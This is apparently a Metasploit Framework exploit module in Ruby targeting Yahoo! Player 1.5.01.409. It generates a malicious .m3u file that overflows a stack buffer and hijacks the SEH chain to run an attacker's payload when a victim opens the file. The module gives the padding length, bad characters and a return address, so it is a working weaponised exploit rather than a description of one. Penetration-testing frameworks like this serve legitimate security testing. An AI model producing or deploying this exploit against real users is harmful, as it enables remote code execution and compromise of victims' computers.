##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'yahoo! player 1.5  (.m3u) Universal Buffer Overflow (SEH)',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in Yahoo! Player 1.5.01.409.
        An attacker must send the file to victim and the victim must open the file.
        Alternatively it may be possible to execute code remotely via an embedded
        PLS file within a browser, when the PLS extention is registered to Yahoo! Player 1.5.01.409.
        This functionality has not been tested in this module.
      },
      'License'        => MSF_LICENSE,
      'Author' 	 =>
        [
          'D3r K0n!G',
          'Death-Shadow-Dark <death.shadow.dark[at]gmail.com>',
        ],
      'References'     =>
        [
          [ 'URL', 'http://www.exploit-db.com/exploits/17735' ],
        ],
      'Payload'        =>
        {
          'Space'    => 5000,
          'BadChars' => "\x00",
          'StackAdjustment' => -3500,
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', { 'Ret' => 0x300117f7 } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 28 2011',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ true, 'The file name.',  'msf.m3u']),
        ], self.class)

  end

  def exploit

    sploit = rand_text_alpha_upper(2049)
    sploit << generate_seh_payload(target.ret)
    sploit << rand_text_alpha_upper(12)

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    file_create(sploit)

  end

end

=begin
http://dev.metasploit.com/redmine/issues/6381
=end
